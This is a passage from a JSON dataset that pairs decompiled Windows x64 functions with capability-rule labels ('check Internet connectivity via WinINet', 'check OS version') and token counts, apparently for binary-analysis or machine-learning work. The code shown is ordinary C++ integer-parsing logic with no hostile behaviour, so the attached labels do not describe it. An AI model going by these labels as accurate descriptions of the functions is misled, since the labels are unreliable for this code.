&uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4416
    },
    "1400487d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400487d0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    char cVar14;\n    bool bVar15;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    uint64_t uVar20;\n    uint8_t uVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint8_t uStack131;\n    bool bStack130;\n    bool bStack129;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar18 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar18 == 0x40) {\n        uVar16 = 8;\ncode_r0x000140048838:\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004885c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140023fd0(ppiStack144);\n            cVar6 = uVar7;\n            bStack130 = *(iVar9 + 0x6e) == cVar6;\n            if ((bStack130) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar14 = *(iVar9 + 0x20);\n                if (((cVar14 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x0001400488c6;\n                fcn.140095670(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140023f10(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140023fd0(ppiStack144);\n                    cVar14 = *(iVar9 + 0x20);\n                    goto code_r0x0001400488c6;\n                }\n                iVar17 = 0;\n                bVar3 = false;\n            }\n            else {\n                bStack130 = false;\n                cVar14 = *(iVar9 + 0x20);\ncode_r0x0001400488c6:\n                iVar17 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar14 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar16 == 10;\n                        if (!bVar3) goto code_r0x0001400488f3;\n                        bVar23 = uVar16 == 8;\n                        if (bVar23 || uVar18 == 0) {\n                            iVar17 = 0;\n                            uVar16 = 8;\n                            bVar3 = bVar23 || uVar18 == 0;\n                        }\n                        else {\n                            iVar17 = iVar17 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x0001400488f3:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004897b;\n                        }\n                        uVar5 = uVar18 == 0 || uVar16 == 0x10;\n                        if (uVar18 != 0 && uVar16 != 0x10) {\n                            bVar3 = true;\n                            uVar18 = uVar16;\n                            goto code_r0x000140048990;\n                        }\n                        iVar17 = 0;\n                        uVar16 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x000140048950;\ncode_r0x000140048d98:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x000140048950;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x000140048d98;\ncode_r0x000140048950:\n                        bVar23 = false;\n                    }\n                    bVar15 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar15) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar15;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar5 = 1;\n                        goto code_r0x00014004897b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x000140048de0:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x000140048de0;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar14 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004897b:\n            uVar18 = uVar16;\n            if (uVar16 == 0x10) goto code_r0x000140048bb6;\n        }\n        else {\n            bStack130 = false;\n            uVar7 = 0;\n            iVar17 = 0;\n            bVar3 = false;\n            uVar18 = uVar16;\n        }\n    }\n    else {\n        uVar16 = 10;\n        if (uVar18 != 8) goto code_r0x000140048838;\n        uVar16 = 0x10;\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004885c;\n        bStack130 = false;\n        uVar7 = 0;\n        iVar17 = 0;\n        bVar3 = false;\ncode_r0x000140048bb6:\n        uVar16 = 0x16;\n        uVar18 = 0x10;\n    }\ncode_r0x000140048990:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar13 = uVar18;\n    uVar21 = *(iVar9 + 0x88);\n    uVar10 = bStack130 + 0x7fffffffffffffff;\n    if (uVar21 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar16;\n            uVar19 = 0;\ncode_r0x000140048a12:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar16 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x000140048c7a;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x000140048c63;\n            iVar8 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar10 / uVar13 < uVar19) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uStack131 = uStack131 | uVar10 - iVar8 < uVar19 * uVar13;\n                        uVar19 = uVar19 * uVar13 + iVar8;\n                        iVar17 = iVar17 + 1;\n                    }\n                    uVar20 = piStack104[3];\n                    if (piStack104[2] < uVar20) {\n                        uVar11 = piStack104[2] + 1;\n                        piStack104[2] = uVar11;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar11 = piVar4[2];\n                        uVar20 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar20 <= uVar11) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar8 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar8 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar2 = uVar5;\n                        uVar21 = 1;\n                        goto code_r0x000140048abf;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar16 < 0xb) goto code_r0x000140048c7a;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x000140048e54:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x000140048c7a;\n                    iVar8 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x000140048a12;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x000140048a12;\n                piStack104 = NULL;\n                if (uVar16 < 0xb) goto code_r0x000140048c7a;\n                cVar6 = -1;\ncode_r0x000140048c63:\n                if (5 < cVar6 + 0x9fU) goto code_r0x000140048e54;\n                iVar8 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x000140048c7a;\n            } while( true );\n        }\n        uVar19 = 0;\n        uVar2 = 0;\n        uVar21 = uVar5;\ncode_r0x000140048abf:\n        uVar5 = uVar2;\n        uVar2 = uVar21;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140048ad2;\ncode_r0x000140048c90:\n        uVar21 = uVar2;\n        fcn.140077ac0(aiStack80, iVar17);\n        cVar6 = fcn.1400b15c0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar17 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140048cda;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar19 = 0;\n            uVar2 = 0;\n            uVar21 = uVar5;\n            goto code_r0x000140048abf;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar19 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x000140048f6c;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar16),  iVar12 != 0))\n              ) {\n            iVar8 = iVar12 - (iVar9 + 0x72);\n            if (0xf < iVar8) {\n                iVar8 = iVar8 + -6;\n            }\n            uVar2 = uVar21;\n            if (uVar19 <= uVar10 / uVar13) {\n                uVar20 = uVar19 * uVar13;\n                uVar19 = uVar20 + iVar8;\n                iVar17 = iVar17 + 1;\n                uVar2 = uStack131 | uVar10 - iVar8 < uVar20;\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar20 = piStack104[3];\n                if (piStack104[2] < uVar20) {\n                    uVar11 = piStack104[2] + 1;\n                    piStack104[2] = uVar11;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar11 = piVar4[2];\n                    uVar20 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack129 = false;\n                if (uVar20 <= uVar11) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack129 = iVar8 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar8 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack129 == bVar23) goto code_r0x000140048abf;\n                uVar7 = fcn.140023fd0(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x000140048f6c:\n                if (iVar17 == 0) {\n                    uVar21 = 0;\n                    goto code_r0x000140048abf;\n                }\n                fcn.140077ac0(aiStack80, iVar17);\n                iVar17 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x000140048c7a:\n        uVar21 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140048c90;\ncode_r0x000140048ad2:\n        if ((bVar3) || (iVar17 != 0)) {\ncode_r0x000140048cda:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    uVar10 = -uVar19;\n                    if (bStack130 == false) {\n                        uVar10 = uVar19;\n                    }\n                    *in_stack_00000038 = uVar10;\n                }\n                else {\n                    uVar10 = 0x7fffffffffffffff;\n                    if (bStack130 != false) {\n                        uVar10 = 0x8000000000000000;\n                    }\n                    *in_stack_00000038 = uVar10;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x000140048b02;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140048b02:\n    if (uVar21 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar17 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (iVar17 == 0) {\n        iVar17 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar17 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar17 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar17 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4452
    },
    "1400491f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400491f0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    char cVar15;\n    bool bVar16;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    int32_t iVar20;\n    uint8_t uVar21;\n    bool bVar22;\n    bool bVar23;\n    bool bVar24;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar18 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar18 == 0x40) {\n        uVar17 = 8;\ncode_r0x000140049258:\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004927c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140023fd0(ppiStack144);\n            cVar6 = uVar7;\n            bVar22 = *(iVar9 + 0x6e) == cVar6;\n            if ((bVar22) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar15 = *(iVar9 + 0x20);\n                if (((cVar15 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x0001400492e6;\n                fcn.140095670(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140023f10(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140023fd0(ppiStack144);\n                    cVar15 = *(iVar9 + 0x20);\n                    goto code_r0x0001400492e6;\n                }\n                iVar20 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar22 = false;\n                cVar15 = *(iVar9 + 0x20);\ncode_r0x0001400492e6:\n                iVar20 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar15 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar17 == 10;\n                        if (!bVar3) goto code_r0x000140049313;\n                        bVar24 = uVar17 == 8;\n                        if (bVar24 || uVar18 == 0) {\n                            iVar20 = 0;\n                            uVar17 = 8;\n                            bVar3 = bVar24 || uVar18 == 0;\n                        }\n                        else {\n                            iVar20 = iVar20 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140049313:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004939b;\n                        }\n                        uVar5 = uVar18 == 0 || uVar17 == 0x10;\n                        if (uVar18 != 0 && uVar17 != 0x10) {\n                            bVar3 = true;\n                            uVar18 = uVar17;\n                            goto code_r0x0001400493b0;\n                        }\n                        iVar20 = 0;\n                        uVar17 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x000140049370;\ncode_r0x000140049768:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x000140049370;\n                        piStack104 = NULL;\n                        bVar24 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x000140049768;\ncode_r0x000140049370:\n                        bVar24 = false;\n                    }\n                    bVar16 = piStack120 != NULL && iStack112 == -1;\n                    bVar23 = iStack112 == -1;\n                    if (bVar16) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar23 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar23 = bVar16;\n                        }\n                    }\n                    if (bVar24 == bVar23) {\n                        uVar5 = 1;\n                        goto code_r0x00014004939b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x0001400497b0:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x0001400497b0;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar15 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004939b:\n            uVar18 = uVar17;\n            if (uVar17 == 0x10) goto code_r0x0001400495a6;\n        }\n        else {\n            bVar22 = false;\n            uVar7 = 0;\n            iVar20 = 0;\n            bVar3 = false;\n            uVar18 = uVar17;\n        }\n    }\n    else {\n        uVar17 = 10;\n        if (uVar18 != 8) goto code_r0x000140049258;\n        uVar17 = 0x10;\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004927c;\n        bVar22 = false;\n        uVar7 = 0;\n        iVar20 = 0;\n        bVar3 = false;\ncode_r0x0001400495a6:\n        uVar17 = 0x16;\n        uVar18 = 0x10;\n    }\ncode_r0x0001400493b0:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar14 = uVar18;\n    uVar21 = *(iVar9 + 0x88);\n    uVar10 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(uVar14), 0);\n    if (uVar21 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar17;\n            uVar11 = 0;\ncode_r0x00014004941c:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar17 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x00014004966a;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x000140049653;\n            iVar8 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar10 < uVar11) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar19 = uVar11 * uVar14;\n                        uVar11 = iVar8 + uVar19;\n                        uStack131 = uStack131 | CARRY8(iVar8, uVar19);\n                        iVar20 = iVar20 + 1;\n                    }\n                    uVar19 = piStack104[3];\n                    if (piStack104[2] < uVar19) {\n                        uVar12 = piStack104[2] + 1;\n                        piStack104[2] = uVar12;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar12 = piVar4[2];\n                        uVar19 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar24 = false;\n                    if (uVar19 <= uVar12) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar24 = iVar8 == -1;\n                    }\n                    bVar23 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar23 = iVar8 == -1;\n                        if (bVar23) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar23 == bVar24) {\n                        uVar2 = uVar5;\n                        uVar21 = 1;\n                        goto code_r0x0001400494c1;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar17 < 0xb) goto code_r0x00014004966a;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x000140049824:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x00014004966a;\n                    iVar8 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x00014004941c;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x00014004941c;\n                piStack104 = NULL;\n                if (uVar17 < 0xb) goto code_r0x00014004966a;\n                cVar6 = -1;\ncode_r0x000140049653:\n                if (5 < cVar6 + 0x9fU) goto code_r0x000140049824;\n                iVar8 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x00014004966a;\n            } while( true );\n        }\n        uVar11 = 0;\n        uVar2 = 0;\n        uVar21 = uVar5;\ncode_r0x0001400494c1:\n        uVar5 = uVar2;\n        uVar2 = uVar21;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x0001400494d1;\ncode_r0x00014004967d:\n        uVar21 = uVar2;\n        fcn.140077ac0(aiStack80, iVar20);\n        cVar6 = fcn.1400b15c0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar20 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x0001400496c1;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar11 = 0;\n            uVar2 = 0;\n            uVar21 = uVar5;\n            goto code_r0x0001400494c1;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar11 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x000140049934;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar13 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar17),  iVar13 != 0))\n              ) {\n            iVar8 = iVar13 - (iVar9 + 0x72);\n            if (0xf < iVar8) {\n                iVar8 = iVar8 + -6;\n            }\n            uVar2 = uVar21;\n            if (uVar11 <= uVar10) {\n                uVar19 = uVar11 * uVar14;\n                uVar11 = iVar8 + uVar19;\n                iVar20 = iVar20 + 1;\n                uVar2 = uStack131 | CARRY8(iVar8, uVar19);\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar19 = piStack104[3];\n                if (piStack104[2] < uVar19) {\n                    uVar12 = piStack104[2] + 1;\n                    piStack104[2] = uVar12;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar12 = piVar4[2];\n                    uVar19 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar19 <= uVar12) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar8 == -1;\n                }\n                bVar24 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar24)) && (bVar24 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar24 = iVar8 == -1;\n                    if (bVar24) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar24) goto code_r0x0001400494c1;\n                uVar7 = fcn.140023fd0(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x000140049934:\n                if (iVar20 == 0) {\n                    uVar21 = 0;\n                    goto code_r0x0001400494c1;\n                }\n                fcn.140077ac0(aiStack80, iVar20);\n                iVar20 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x00014004966a:\n        uVar21 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014004967d;\ncode_r0x0001400494d1:\n        if ((iVar20 != 0) || (bVar3)) {\ncode_r0x0001400496c1:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar22) {\n                        uVar11 = -uVar11;\n                    }\n                    *in_stack_00000038 = uVar11;\n                }\n                else {\n                    *in_stack_00000038 = 0xffffffffffffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x000140049501;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140049501:\n    if (uVar21 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x140102a70 == 0) {\n        iVar20 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar20 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar20 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar20 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4410
    },
    "140049bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140049bc0(uint *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint8_t uVar7;\n    char cVar8;\n    char cVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    ulong arg2;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint8_t uVar17;\n    int32_t iVar18;\n    uint8_t uVar19;\n    bool bVar20;\n    bool bVar21;\n    int64_t in_stack_00000028;\n    uint *in_stack_00000030;\n    int64_t *in_stack_00000038;\n    uint8_t uStack145;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    ulong uStack104;\n    uint32_t uStack96;\n    uint uStack92;\n    int64_t aiStack80 [2];\n    \n    uStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar12 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar5 = fcn.140023f10(&uStack104, &piStack120);\n    if (uVar5 == 0) {\n        uVar10 = fcn.140023fd0(&uStack104);\n        cVar6 = *(iVar12 + 0x20);\n        cVar8 = *(iVar12 + 0x6f);\n        cVar9 = uVar10;\n        if (cVar8 == cVar9) {\n            if (cVar6 == '\\0') {\n                uVar15 = 0x2b;\n                cVar8 = *(iVar12 + 0x48);\n                goto joined_r0x00014004a757;\n            }\ncode_r0x00014004a6ba:\n            if 